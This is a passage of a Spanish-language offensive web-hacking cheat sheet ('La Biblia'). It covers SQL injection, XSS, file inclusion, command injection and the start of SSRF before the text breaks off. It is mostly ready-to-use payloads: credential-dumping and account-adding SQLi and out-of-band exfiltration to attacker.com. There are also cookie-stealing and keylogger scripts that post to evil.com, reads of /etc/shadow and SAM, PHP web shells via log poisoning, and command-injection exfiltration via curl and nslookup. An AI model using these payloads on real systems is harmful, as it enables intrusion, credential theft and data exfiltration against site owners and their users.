## Indice

> ⏱️ **Tiempo estimado:** 40 horas (~5 dias) (4851 lineas)


1. [1. SQL Injection (SQLi)](#1-sql-injection-sqli)
    - [Deteccion por Motor de Base de Datos](#deteccion-por-motor-de-base-de-datos)
    - [Error-Based SQLi](#error-based-sqli)
    - [Union-Based SQLi](#union-based-sqli)
    - [Blind SQLi (Boolean)](#blind-sqli-boolean)
    - [Blind SQLi (Time-Based)](#blind-sqli-time-based)
    - [Second-Order SQLi](#second-order-sqli)
    - [Out-of-Band SQLi (DNS/HTTP)](#out-of-band-sqli-dnshttp)
    - [Stacked Queries](#stacked-queries)
    - [WAF Bypass](#waf-bypass)
    - [Sqlmap](#sqlmap)
    - [Comparativa de Motores SQL](#comparativa-de-motores-sql)
2. [2. XSS - Cross-Site Scripting](#2-xss-cross-site-scripting)
    - [Tipos de XSS](#tipos-de-xss)
    - [Payloads por Contexto](#payloads-por-contexto)
    - [Robo de Cookies](#robo-de-cookies)
    - [Keylogger](#keylogger)
    - [XSS en Frameworks Modernos](#xss-en-frameworks-modernos)
    - [Bypass de Filtros](#bypass-de-filtros)
    - [XSStrike](#xsstrike)
    - [Dalfox](#dalfox)
3. [3. LFI / RFI - File Inclusion](#3-lfi-rfi-file-inclusion)
    - [Local File Inclusion (LFI)](#local-file-inclusion-lfi)
    - [Encoding](#encoding)
    - [LFI a RCE - Log Poisoning](#lfi-a-rce-log-poisoning)
    - [PHP Wrappers](#php-wrappers)
    - [RFI](#rfi)
4. [4. Command Injection](#4-command-injection)
    - [Separadores](#separadores)
    - [Blind - Out-of-Band](#blind-out-of-band)
    - [Bypass de Filtros](#bypass-de-filtros)
    - [Commix](#commix)
5. [5. SSRF - Server-Side Request Forgery](#5-ssrf-server-side-request-forgery)
    - [Cloud Metadata](#cloud-metadata)
    - [Internal Scanning](#internal-scanning)
    - [Bypass](#bypass)
6. [6. Directory Traversal](#6-directory-traversal)
7. [7. File Upload](#7-file-upload)
    - [Extensiones](#extensiones)
    - [Bypass](#bypass)
    - [.htaccess](#htaccess)
    - [Race Condition](#race-condition)
8. [8. IDOR - Insecure Direct Object Reference](#8-idor-insecure-direct-object-reference)
    - [Bypass](#bypass)
9. [9. XXE - XML External Entity (Completo)](#9-xxe-xml-external-entity-completo)
    - [In-Band XXE - Lectura de Archivos](#in-band-xxe-lectura-de-archivos)
    - [SSRF via XXE](#ssrf-via-xxe)
    - [Blind Error-Based XXE](#blind-error-based-xxe)
    - [Blind OOB XXE - DTD Exfiltracion](#blind-oob-xxe-dtd-exfiltracion)
    - [Blind OOB XXE - FTP Exfiltracion](#blind-oob-xxe-ftp-exfiltracion)
    - [XXE en SVG](#xxe-en-svg)
    - [XXE en SOAP](#xxe-en-soap)
    - [XXE en RSS/Atom](#xxe-en-rssatom)
    - [XXE en DOCX](#xxe-en-docx)
    - [XXE en PDF/FDF](#xxe-en-pdffdf)
    - [XXE en SAML](#xxe-en-saml)
    - [Parameter Entities vs General Entities](#parameter-entities-vs-general-entities)
    - [CDATA Injection](#cdata-injection)
    - [XInclude (cuando no podes modificar el DTD)](#xinclude-cuando-no-podes-modificar-el-dtd)
    - [PHP Wrappers en XXE](#php-wrappers-en-xxe)
    - [jar: Protocol (Java XXE)](#jar-protocol-java-xxe)
    - [Herramientas](#herramientas)
10. [10. SSTI - Server-Side Template Injection (Completo)](#10-ssti-server-side-template-injection-completo)
    - [Deteccion Generica](#deteccion-generica)
    - [Jinja2 / Nunjucks (Python - Flask/Django)](#jinja2-nunjucks-python-flaskdjango)
    - [Twig (PHP - Symfony, Drupal 8+)](#twig-php-symfony-drupal-8)
    - [Freemarker (Java - Spring MVC)](#freemarker-java-spring-mvc)
    - [Smarty (PHP)](#smarty-php)
    - [Velocity (Java)](#velocity-java)
    - [Mako (Python)](#mako-python)
    - [Tornado (Python)](#tornado-python)
    - [Go text/template y html/template](#go-texttemplate-y-htmltemplate)
    - [ERB (Ruby on Rails)](#erb-ruby-on-rails)
    - [Jade / Pug (Node.js)](#jade-pug-nodejs)
    - [Handlebars (Node.js)](#handlebars-nodejs)
    - [Liquid (Shopify)](#liquid-shopify)
    - [tplmap - SSTI Automation](#tplmap-ssti-automation)
11. [11. HTTP Request Smuggling (Completo)](#11-http-request-smuggling-completo)
    - [CL.TE](#clte)
    - [TE.CL](#tecl)
    - [TE.TE Obfuscation](#tete-obfuscation)
    - [HTTP/2 Downgrade Smuggling](#http2-downgrade-smuggling)
    - [Connection Reuse Attacks](#connection-reuse-attacks)
    - [Web Cache Poisoning via Smuggling](#web-cache-poisoning-via-smuggling)
    - [Response Queue Poisoning](#response-queue-poisoning)
    - [Deteccion Automatica](#deteccion-automatica)
12. [12. JWT Attacks](#12-jwt-attacks)
    - [None Algorithm](#none-algorithm)
    - [Algorithm Confusion (RS256 -> HS256)](#algorithm-confusion-rs256-hs256)
    - [Weak Secret (HS256)](#weak-secret-hs256)
    - [JKU / KID Injection](#jku-kid-injection)
    - [JWK Header Injection](#jwk-header-injection)
    - [jwt_tool](#jwttool)
13. [13. GraphQL Attacks](#13-graphql-attacks)
    - [Introspection](#introspection)
    - [SQLi via GraphQL](#sqli-via-graphql)
    - [NoSQLi via GraphQL](#nosqli-via-graphql)
    - [Batching Attack](#batching-attack)
    - [Depth DoS](#depth-dos)
    - [Tools](#tools)
14. [14. NoSQL Injection](#14-nosql-injection)
    - [MongoDB](#mongodb)
    - [MongoDB - Automatization](#mongodb-automatization)
    - [CouchDB](#couchdb)
    - [NoSQLMap](#nosqlmap)
15. [15. Herramientas de Automatizacion](#15-herramientas-de-automatizacion)
    - [Nuclei](#nuclei)
    - [ffuf](#ffuf)
    - [nikto](#nikto)
    - [Gobuster / wfuzz](#gobuster-wfuzz)
16. [16. API Security Testing](#16-api-security-testing)
    - [Metodologia REST API](#metodologia-rest-api)
    - [Mass Assignment / Property Injection](#mass-assignment-property-injection)
    - [Path Traversal en Endpoints](#path-traversal-en-endpoints)
    - [API Authentication Testing](#api-authentication-testing)
    - [OAuth2 Flow Testing](#oauth2-flow-testing)
    - [Rate Limiting Bypass](#rate-limiting-bypass)
    - [API Versioning Attacks](#api-versioning-attacks)
    - [gRPC API Testing](#grpc-api-testing)
    - [SOAP API Testing](#soap-api-testing)
    - [Serverless API Testing](#serverless-api-testing)
    - [Swagger/OpenAPI Discovery](#swaggeropenapi-discovery)
17. [17. OAuth 2.0](#17-oauth-20)
    - [Authorization Code Flow Exploitation](#authorization-code-flow-exploitation)
    - [Redirect URI Manipulation](#redirect-uri-manipulation)
    - [State Parameter CSRF](#state-parameter-csrf)
    - [Authorization Code Injection](#authorization-code-injection)
    - [Implicit Flow Deprecation Issues](#implicit-flow-deprecation-issues)
    - [Client Credentials Abuse](#client-credentials-abuse)
    - [Refresh Token Rotation Bypass](#refresh-token-rotation-bypass)
    - [Scope Escalation via Token Swap](#scope-escalation-via-token-swap)
    - [PKCE Bypass Techniques](#pkce-bypass-techniques)
    - [Consent Screen Injection](#consent-screen-injection)
    - [OAuth Tools](#oauth-tools)
18. [18. SAML / SSO](#18-saml-sso)
    - [SAML XML Signature Wrapping (XSW)](#saml-xml-signature-wrapping-xsw)
    - [SAML Response Tampering](#saml-response-tampering)
    - [Assertion Replay](#assertion-replay)
    - [Audience Restriction Bypass](#audience-restriction-bypass)
    - [Issuer Spoofing](#issuer-spoofing)
    - [AuthnRequest Manipulation](#authnrequest-manipulation)
    - [Session Fixation via SSO](#session-fixation-via-sso)
    - [ADFS Authentication Bypass](#adfs-authentication-bypass)
    - [Okta Misconfigurations](#okta-misconfigurations)
    - [Azure AD Seamless SSO](#azure-ad-seamless-sso)
    - [SAMLRaider Workflow](#samlraider-workflow)
19. [19. Race Conditions](#19-race-conditions)
    - [Race Condition Detection](#race-condition-detection)
    - [Race in Coupon/Cart/Payment Flows](#race-in-couponcartpayment-flows)
    - [Race in Account Creation](#race-in-account-creation)
    - [Race in File Upload](#race-in-file-upload)
    - [Race in Email Verification](#race-in-email-verification)
    - [Race in Database State](#race-in-database-state)
20. [20. WebSockets Security](#20-websockets-security)
    - [CSWSH - Cross-Site WebSocket Hijacking](#cswsh-cross-site-websocket-hijacking)
    - [WS Content Injection](#ws-content-injection)
    - [WS Authentication Replay](#ws-authentication-replay)
    - [WS SQL Injection](#ws-sql-injection)
    - [WS DoS](#ws-dos)
    - [WS MITM con mitmproxy](#ws-mitm-con-mitmproxy)
    - [WS Tunneling](#ws-tunneling)
    - [WS Protocol Downgrade](#ws-protocol-downgrade)
    - [WS Origin Verification Bypass](#ws-origin-verification-bypass)
21. [21. Post-Exploitation Web](#21-post-exploitation-web)
    - [Web Shells Comparison](#web-shells-comparison)
    - [WAF Evasion para Webshell Traffic](#waf-evasion-para-webshell-traffic)
    - [Database Pivot desde Webshell](#database-pivot-desde-webshell)
    - [Tunnel Traffic Through Webshell](#tunnel-traffic-through-webshell)
    - [Log Cleaning on Web Servers](#log-cleaning-on-web-servers)
22. [22. Burp Suite Completo](#22-burp-suite-completo)
    - [Burp Proxy - Configuracion Profunda](#burp-proxy-configuracion-profunda)
    - [Burp Repeater - Session Handling](#burp-repeater-session-handling)
    - [Burp Intruder - Tipos de Ataque](#burp-intruder-tipos-de-ataque)
    - [Intruder - Payload Processing](#intruder-payload-processing)
    - [Burp Sequencer - Token Analysis](#burp-sequencer-token-analysis)
    - [Burp Decoder](#burp-decoder)
    - [Burp Comparer - HTTP Diffs](#burp-comparer-http-diffs)
    - [Burp Extender - Extensiones](#burp-extender-extensiones)
    - [Session Handling Rules](#session-handling-rules)
    - [Burp Collaborator Client](#burp-collaborator-client)
    - [Burp REST API y Headless (CI/CD)](#burp-rest-api-y-headless-cicd)
23. [23. CI/CD Pipeline Security](#23-cicd-pipeline-security)
    - [ZAP en CI/CD](#zap-en-cicd)
    - [Nuclei en GitHub Actions/GitLab CI](#nuclei-en-github-actionsgitlab-ci)
    - [Nikto en Pipelines](#nikto-en-pipelines)
    - [Custom Python Scanners](#custom-python-scanners)
    - [DAST vs SAST vs IAST vs RASP](#dast-vs-sast-vs-iast-vs-rasp)
    - [Automated Crawling + Scanning](#automated-crawling-scanning)
24. [24. CSP - Content Security Policy Bypass](#24-csp-content-security-policy-bypass)
    - [CSP Evaluation Tooling](#csp-evaluation-tooling)
    - [script-src Bypass - CDN Whitelist](#script-src-bypass-cdn-whitelist)
    - [script-src Bypass - JSONP Endpoints](#script-src-bypass-jsonp-endpoints)
    - [script-src Bypass - Angular (1.x) Sandbox Escape](#script-src-bypass-angular-1x-sandbox-escape)
    - [script-src Bypass - googleapis](#script-src-bypass-googleapis)
    - [style-src Bypass](#style-src-bypass)
    - [img-src Bypass - Data Exfiltration](#img-src-bypass-data-exfiltration)
    - [Nonce/Random Bypass](#noncerandom-bypass)
    - [strict-dynamic Bypass](#strict-dynamic-bypass)
    - [CSP Violation Reporting Abuse](#csp-violation-reporting-abuse)
25. [25. DOM-Based Vulnerabilities](#25-dom-based-vulnerabilities)
    - [DOM XSS](#dom-xss)
    - [DOM Clobbering](#dom-clobbering)
    - [DOM Injection](#dom-injection)
    - [DOM-Based Open Redirect](#dom-based-open-redirect)
    - [DOM-Based Cookie Manipulation](#dom-based-cookie-manipulation)
    - [DOM-Based Prototype Pollution](#dom-based-prototype-pollution)
    - [DOM-based Vulnerabilities Detection](#dom-based-vulnerabilities-detection)
26. [26. CORS Misconfiguration](#26-cors-misconfiguration)
    - [Origin Reflection (Null)](#origin-reflection-null)
    - [Credentialed Requests with Wildcard Origin](#credentialed-requests-with-wildcard-origin)
    - [Preflight Cache Bypass](#preflight-cache-bypass)
    - [CORS Scanner con Burp](#cors-scanner-con-burp)
    - [CORS Exploit Examples](#cors-exploit-examples)
27. [27. Automated Discovery and Scanning](#27-automated-discovery-and-scanning)
    - [ffuf - Workflow Completo](#ffuf-workflow-completo)
    - [gau / waybackurls / Hakrawler / Katana](#gau-waybackurls-hakrawler-katana)
    - [httpx - Probing](#httpx-probing)
    - [Subfinder / Assetfinder](#subfinder-assetfinder)
    - [nuclei - Templates Development](#nuclei-templates-development)
    - [Generating Custom Wordlists](#generating-custom-wordlists)
    - [dalfox - XSS Automation](#dalfox-xss-automation)
    - [kxss - Reflected XSS Detection](#kxss-reflected-xss-detection)
    - [Pipeline Completo de Descubrimiento](#pipeline-completo-de-descubrimiento)
28. [Recursos y Cheatsheets](#recursos-y-cheatsheets)
    - [Wordlists Recomendadas](#wordlists-recomendadas)
    - [Herramientas Esenciales](#herramientas-esenciales)
    - [Extensiones de Navegador para Pentesting](#extensiones-de-navegador-para-pentesting)
    - [Checklist de Seguridad Web](#checklist-de-seguridad-web)
    - [Extra: Broken Access Control](#extra-broken-access-control)
    - [Extra: Deserialization Attacks](#extra-deserialization-attacks)
    - [Extra: Insecure Cryptography](#extra-insecure-cryptography)
    - [Extra: Logging and Monitoring Bypass](#extra-logging-and-monitoring-bypass)
    - [Extra: Mobile API Testing](#extra-mobile-api-testing)
    - [Extra: Advanced SQLi Techniques](#extra-advanced-sqli-techniques)
    - [Extra: Container and Kubernetes Security](#extra-container-and-kubernetes-security)
    - [Extra: GraphQL Batching for Credential Stuffing](#extra-graphql-batching-for-credential-stuffing)
    - [Extra: Serverless Event Injection](#extra-serverless-event-injection)
    - [Extra: HTTP/2 Specific Attacks](#extra-http2-specific-attacks)
    - [Extra: Web Cache Poisoning Techniques](#extra-web-cache-poisoning-techniques)
    - [Extra: HTTP Request Smuggling - Advanced Payloads](#extra-http-request-smuggling-advanced-payloads)
    - [Extra: Server-Side Prototype Pollution](#extra-server-side-prototype-pollution)
    - [Extra: Advanced NoSQL Injection Techniques](#extra-advanced-nosql-injection-techniques)
    - [Extra: OAuth 2.0 Device Code Grant Phishing](#extra-oauth-20-device-code-grant-phishing)
    - [Extra: Business Logic Vulnerabilities](#extra-business-logic-vulnerabilities)
    - [Extra: GraphQL Abuse Patterns](#extra-graphql-abuse-patterns)
    - [Extra: Tools Cheatsheet - One-Liners](#extra-tools-cheatsheet-one-liners)
    - [Extra: Red Team Infrastructure Setup](#extra-red-team-infrastructure-setup)

---

# Web Hacking - La Biblia

Tecnicas de hacking web re copadas organizadas por tipo de [vulnerabilidad](../raw/s3c-f0nd4m3nt0s.md#vulnerabilidades), con payloads, herramientas, bypass y ejemplos posta. Todo en argentino asi que preparate.

## Indice

1. [SQL Injection - SQLi](#sqli)
2. [XSS - Cross-Site Scripting](#xss)
3. [LFI / RFI - File Inclusion](#lfi)
4. [Command Injection](#cmd-injection)
5. [SSRF - Server-Side Request Forgery](#ssrf)
6. [Directory Traversal](#directory-traversal)
7. [File Upload](#file-upload)
8. [IDOR - Insecure Direct Object Reference](#idor)
9. [XXE - XML External Entity Completo](#xxe)
10. [SSTI - Server-Side Template Injection Completo](#ssti)
11. [HTTP Request Smuggling Completo](#smuggling)
12. [JWT Attacks](#jwt)
13. [GraphQL Attacks](#graphql)
14. [NoSQL Injection](#nosql)
15. [Herramientas de Automatizacion](#tools)
16. [API Security Testing](#api-testing)
17. [OAuth 2.0](#oauth)
18. [SAML / SSO](#saml)
19. [Race Conditions](#race)
20. [WebSockets Security](#websockets)
21. [Post-Exploitation Web](#postexplotacion)
22. [Burp Suite Completo](#burp)
23. [CI/CD Pipeline Security](#cicd)
24. [CSP - Content Security Policy Bypass](#csp)
25. [DOM-Based Vulnerabilities](#dom)
26. [CORS Misconfiguration](#cors)
27. [Automated Discovery and Scanning](#discovery)

---

<a name="sqli"></a>
## 1. [sql injection](../raw/w3b-h4ck1ng.md#sql-injection) ([sqli](../raw/w3b-h4ck1ng.md#sql-injection))

### Deteccion por Motor de Base de Datos

Cada motor de BD tiene su mania. La deteccion inicial es clave.

```sql
-- MySQL / MariaDB
?id=1'
?id=1' --
?id=1' /*
?id=1' AND 1=1 --
?id=1' AND 1=2 --
?id=1' AND SLEEP(5) --

-- PostgreSQL
?id=1'--
?id=1'/*
?id=1' AND 1=1--
?id=1' AND 1=2--
?id=1' AND (SELECT pg_sleep(5))--

-- MSSQL
?id=1'--
?id=1' AND 1=1--
?id=1' AND 1=2--
?id=1' WAITFOR DELAY '0:0:5'--

-- Oracle
?id=1'
?id=1'--
?id=1' AND 1=1--
?id=1' AND 1=2--
?id=1' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
```

### Error-Based SQLi

```sql
-- MySQL
' AND extractvalue(1, concat(0x7e, (SELECT database()))) --
' AND extractvalue(1, concat(0x7e, (SELECT group_concat(table_name) FROM information_schema.tables))) --
' AND extractvalue(1, concat(0x7e, (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'))) --
' AND updatexml(1, concat(0x7e, (SELECT user())), 1) --

-- PostgreSQL
' AND CAST((SELECT version()) AS integer) = 1 --
' AND COALESCE(CAST((SELECT current_database()) AS text), '')::int = 1 --

-- MSSQL
' AND convert(int, (SELECT db_name())) --

-- Oracle
' AND ctxsys.drithsx.sn(1, (SELECT user FROM dual)) --
```

### Union-Based SQLi

```sql
-- Encontrar columnas con ORDER BY
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 100--

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

-- MySQL
' UNION SELECT 1,database(),user()--
' UNION SELECT 1,@@version,@@hostname--
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,group_concat(username,':',password),3 FROM users--

-- PostgreSQL
' UNION SELECT 1,current_database(),current_user--
' UNION SELECT 1,version(),current_user--
' UNION SELECT 1,table_name,NULL FROM information_schema.tables WHERE table_schema='public'--
' UNION SELECT 1,string_agg(username||':'||password, ','),3 FROM users--

-- MSSQL
' UNION SELECT 1,db_name(),user_name()--
' UNION SELECT 1,@@version,user_name()--
' UNION SELECT 1,name,NULL FROM sys.tables--
' UNION SELECT 1,username+':'+password,3 FROM users--

-- Oracle
' UNION SELECT 1,table_name,NULL FROM all_tables--
' UNION SELECT 1,column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
' UNION SELECT 1,username||':'||password,3 FROM users--
```

### Blind SQLi (Boolean)

```sql
?id=1' AND SUBSTRING((SELECT database()),1,1)='a' --
?id=1' AND ASCII(SUBSTRING((SELECT database()),1,1))>97 --
?id=1' AND (SELECT COUNT(*) FROM users)>0 --
?id=1' AND (SELECT LENGTH(database()))>5 --
```

### Blind SQLi (Time-Based)

```sql
-- MySQL
?id=1' AND SLEEP(5)--
?id=1' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>97,SLEEP(5),0)--

-- PostgreSQL
?id=1' AND (SELECT pg_sleep(5))--
?id=1' AND (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT current_database()),1,1))>97) THEN pg_sleep(5) ELSE 0 END)--

-- MSSQL
?id=1' WAITFOR DELAY '0:0:5'--
?id=1' IF (ASCII(SUBSTRING(DB_NAME(),1,1))>97) WAITFOR DELAY '0:0:5'--

-- Oracle
?id=1' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--

# Time-based automation en Python
print("""
import requests, time, string
url = 'http://target.com/page'
chars = string.ascii_lowercase + string.digits + '_'
dbname = ''
for i in range(1, 20):
    for c in chars:
        payload = {'id': f"1' AND IF(ASCII(SUBSTRING((SELECT database()),{i},1))={ord(c)},SLEEP(2),0) -- "}
        start = time.time()
        r = requests.get(url, params=payload)
        elapsed = time.time() - start
        if elapsed > 1.5:
            dbname += c
            break
print(f'Database: {dbname}')
""")
```

### Second-Order SQLi

Se guarda en la BD y se ejecuta despues. Ej: registro con username malicioso.

```sql
-- Registrar con nombre: ' OR '1'='1' --
-- Despues el server ejecuta:
SELECT * FROM usuarios WHERE nombre = '' OR '1'='1' --

-- Payloads utilies:
admin' --
' UNION SELECT 1,2,3 --
'; UPDATE users SET password='hacked' WHERE username='admin' --
```

### Out-of-Band SQLi ([dns](../raw/r3d3s-f0nd4m3nt0s.md#dns)/[http](../raw/r3d3s-f0nd4m3nt0s.md#http))

```sql
-- MySQL
SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT database()),'.attacker.com\\\\test'))

-- PostgreSQL
COPY (SELECT current_database()) TO PROGRAM 'nslookup '||(SELECT current_database())||'.attacker.com'

-- MSSQL
EXEC master.dbo.xp_dirtree '\\\\'+(SELECT db_name())+'.attacker.com\\test'

-- Oracle
SELECT UTL_HTTP.request('http://'||(SELECT user FROM dual)||'.attacker.com/') FROM dual
```

### Stacked Queries

```sql
-- MySQL (depende del driver)
?id=1'; INSERT INTO users(username, password) VALUES('hacker','pass'); --

-- MSSQL (casi siempre)
?id=1'; EXEC xp_cmdshell 'whoami'; --
?id=1'; EXEC sp_addlogin 'hacker', 'pass'; --

-- PostgreSQL
?id=1'; CREATE TABLE hack(data text); --
```

### WAF Bypass

```sql
-- Comentarios internos
'/**/OR/**/1=1--
' UN/**/ION SE/**/LECT 1,2,3--

-- Case variation
' UnIoN SeLeCt 1,2,3--

-- Doubled keywords
' UNUNIONION SELSELECTECT 1,2,3--
' OORR 1=1--

-- Hex encoding
SELECT 0x7573657273 FROM users--

-- Null bytes
' UNION%00SELECT 1,2,3--

-- HPP
?id=1&id=1' UNION SELECT 1,2,3--

-- Buffer overflow WAF
?id=1' + 'A'*10000 + ' UNION SELECT 1,2,3--
```

### [sqlmap](../raw/w3b-h4ck1ng.md#sqlmap)

`ash
sqlmap -u "http://target.[com](../raw/w1n-s9bsyst3ms.md#com)/page?id=1" --batch
sqlmap -u "http://target.com/login" --data="user=admin&pass=test"
sqlmap -u "..." --cookie="PHPSESSID=abc123"
sqlmap -u "..." --[proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy)="http://127.0.0.1:8080"
sqlmap -u "..." --dbs
sqlmap -u "..." -D dbname --tables
sqlmap -u "..." -D dbname -T users --dump
sqlmap -u "..." --os-shell
sqlmap -u "..." --file-read="/etc/passwd"
sqlmap -u "..." --technique=BEU --level=5 --risk=3
sqlmap -u "..." --tamper=space2comment,randomcase,between
sqlmap -u "..." --threads=10
sqlmap -r request.txt --batch
sqlmap -u "http://target.com" --forms --batch
```

### Comparativa de Motores SQL

| Operacion | MySQL | PostgreSQL | MSSQL | Oracle | SQLite |
|-----------|-------|------------|-------|--------|--------|
| Version | @@version | version() | @@version | SELECT * FROM v | sqlite_version() |
| DB actual | database() | current_database() | db_name() | sys_context | file |
| Usuario | user() | current_user | user_name() | SELECT user FROM dual | N/A |
| Tablas | information_schema.tables | information_schema.tables | sys.tables | all_tables | sqlite_master |
| Sleep | SLEEP(5) | pg_sleep(5) | WAITFOR DELAY | DBMS_PIPE.RECEIVE_MESSAGE | N/A |
| Limit | LIMIT 1 OFFSET 0 | LIMIT 1 OFFSET 0 | OFFSET 0 ROWS FETCH | ROWNUM=1 | LIMIT 1 OFFSET 0 |
| Comments | -- # /* */ | -- /* */ | -- /* */ | -- /* */ | -- /* */ |

<a name="xss"></a>
## 2. XSS - Cross-Site Scripting

### Tipos de XSS

| Tipo | Descripcion | Persistencia | Peligro |
|------|-------------|-------------|---------|
| Reflected | Parametro en URL, se refleja en la respuesta | No | Medio |
| Stored | Se guarda en la BD (comentario, perfil, post) | Si | Alto |
| DOM-based | Se ejecuta en el cliente via JS, nunca llega al server | Variable | Medio |
| Self-XSS | Solo el usuario puede ejecutarlo en su sesion | No | Bajo |
| mXSS | Mutation XSS - confusion de parseo del browser | Variable | Alto |
| Universal XSS | XSS en el navegador mismo o en extensiones | Variable | Critico |
| Blind XSS | Se ejecuta en el panel de admin (tickets, logs) | Si | Alto |

### Payloads por Contexto

```html
<script>alert('[xss](../raw/w3b-h4ck1ng.md#xss)')</script>
<script>fetch('[https](../raw/r3d3s-f0nd4m3nt0s.md#https)://evil.com/steal?c='+document.cookie)</script>
<img src=x onerror=alert(1)>

"><script>alert(1)</script>
" autofocus onfocus="alert(1)
" onload="alert(1)

javascript:alert(1)
javascrip&#116;:alert(1)

<div style="background-image: url(javascript:alert(1))">

<img src=x onerror=alert`1`>
<img src=x onerror=confirm`1`>

<svg onload=alert(1)>
<svg/onload=alert(1)>
<svg><script>alert(1)</script></svg>

<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<video><source onerror="alert(1)">

<iframe srcdoc="<script>alert(1)</script>">
<iframe src=javascript:alert(1)>
```

### Robo de Cookies

```html
<script>document.location='https://evil.com/steal?c='+document.cookie</script>
<script>new Image().src='https://evil.com/steal?c='+encodeURIComponent(document.cookie)</script>
<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
<script>navigator.sendBeacon('https://evil.com/', document.cookie)</script>
<script>
var ws=new WebSocket('wss://evil.com/');
ws.onopen=function(){ws.send(document.cookie)};
</script>
```

### Keylogger

```javascript
document.onkeypress = function(e) {
    fetch('https://evil.com/keylog?k='+e.key+'&t='+Date.now())
}
document.querySelectorAll('input').forEach(function(i) {
    i.addEventListener('keyup', function(e) {
        fetch('https://evil.com/keylog?name='+this.name+'&val='+this.value)
    })
})
```

### XSS en Frameworks Modernos

```javascript
// Angular
{{constructor.constructor('alert(1)')()}}

// Vue.js
<div v-html="'<img src=x onerror=alert(1)>'"></div>

// React
<div dangerouslySetInnerHTML={{__html: "<img src=x onerror=alert(1)>"}} />

// jQuery
$('#target').html('<img src=x onerror=alert(1)>')
```

### Bypass de Filtros

```html
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x ONERROR=alert(1)>
<script>eval(atob('YWxlcnQoMSk='))</script>
<script>\u0061lert(1)</script>
<script>\x61lert(1)</script>
<img src=x
onerror=alert(1)>
<img src=x    onerror=alert(1)>
<script>eval('\141\154\145\162\164(1)')</script>
<script>alert.call`${1}`</script>

<!-- Polyglot -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )
```

### XSStrike

```bash
xsstrike -u "http://target.com/search?q=test"
xsstrike -u "http://target.com" --data "name=test"
xsstrike -u "http://target.com" --crawl
xsstrike -u "http://target.com" --params "id,name,page"
xsstrike -u "http://target.com" --blind
```

### Dalfox

```bash
dalfox url http://target.com/page?id=1
dalfox file urls.txt
gau target.com | dalfox pipe
dalfox url http://target.com --blind https://evil.com/hook
dalfox url http://target.com --waf-evasion
dalfox url http://target.com --worker 50
```

---

<a name="lfi"></a>
## 3. LFI / RFI - File Inclusion

### Local File Inclusion (LFI)

```bash
# Linux
http://target.com/page=../../etc/passwd
http://target.com/page=../../etc/shadow
http://target.com/page=../../../etc/issue
http://target.com/page=../../etc/hosts
http://target.com/page=../../etc/crontab
http://target.com/page=../../etc/ssh/sshd_config
http://target.com/page=../../proc/self/environ
http://target.com/page=../../proc/self/cmdline
http://target.com/page=../../proc/version
http://target.com/page=../../var/log/apache2/access.log
http://target.com/page=../../var/log/nginx/access.log

# Windows
http://target.com/page=../../windows/win.ini
http://target.com/page=../../windows/system32/drivers/etc/hosts
http://target.com/page=../../boot.ini
http://target.com/page=../../windows/system32/config/SAM
http://target.com/page=../../inetpub/wwwroot/web.config
```

### Encoding

```bash
http://target.com/page=..%2f..%2f..%2fetc/passwd
http://target.com/page=..%252f..%252f..%252fetc/passwd
http://target.com/page=..%c0%af..%c0%af..%c0%afetc/passwd
http://target.com/page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
http://target.com/page=../../etc/passwd%00
```

### LFI a RCE - Log Poisoning

```bash
curl -X GET "http://target.com/page=<?php system($_GET['cmd']);?>"

http://target.com/page=/var/log/apache2/access.log&cmd=id
http://target.com/page=/var/log/nginx/access.log&cmd=id
http://target.com/page=/var/log/httpd/access_log&cmd=id
http://target.com/page=/proc/self/fd/2&cmd=id

# /proc/self/environ
curl -H "User-Agent: <?php system('id');?>" http://target.com/
http://target.com/page=../../proc/self/environ
```

### PHP Wrappers

```bash
# File read
http://target.com/page=php://filter/convert.base64-encode/resource=config.php
http://target.com/page=php://filter/read=convert.base64-encode/resource=../../etc/passwd

# PHP input (allow_url_include=On)
POST /page=php://input
Content-Type: text/plain
<?php system('id');?>

# Data URI (allow_url_include=On)
http://target.com/page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=

# PHP filter chain RCE (Synacktiv)
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]);?>'
```

### RFI

```bash
http://target.com/page=http://evil.com/shell.txt
http://target.com/page=ftp://evil.com/shell.txt
http://target.com/page=\\evil.com\share\shell.txt
```

<a name="cmd-injection"></a>
## 4. Command Injection

### Separadores

```bash
command; id                          # secuencial
command | id                         # pipe
command || id                        # OR
command && id                        # AND
command `id`                         # backticks
command $(id)                        # sub-shell
command %0A id                       # newline
command & id                         # background
```

### Blind - Out-of-Band

```bash
command; nslookup $(whoami).attacker.com
command; dig @evil.com $(whoami).evil.com
command; curl http://evil.com/$(whoami)
command; wget http://evil.com/$(hostname)
command; sleep 5
command || ping -c 10 127.0.0.1
```

### Bypass de Filtros

```bash
# Espacios
command${IFS}-la
command%09-la
command$IFS-la

# Slash
command${HOME:0:1}etc${HOME:0:1}passwd
command$(printf '\x2f')etc$(printf '\x2f')passwd

# Blacklist con base64
$(echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d)

# Wildcards
command /???/c?t /???/p??s??
```

### Commix

```bash
commix -u "http://target.com/page?cmd=test"
commix --url="http://target.com" --data="name=test"
commix -u "..." --os-shell
commix -u "..." --file-read="/etc/passwd"
commix -r request.txt --batch
```

<a name="ssrf"></a>
## 5. SSRF - Server-Side Request Forgery

### Cloud Metadata

```bash
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
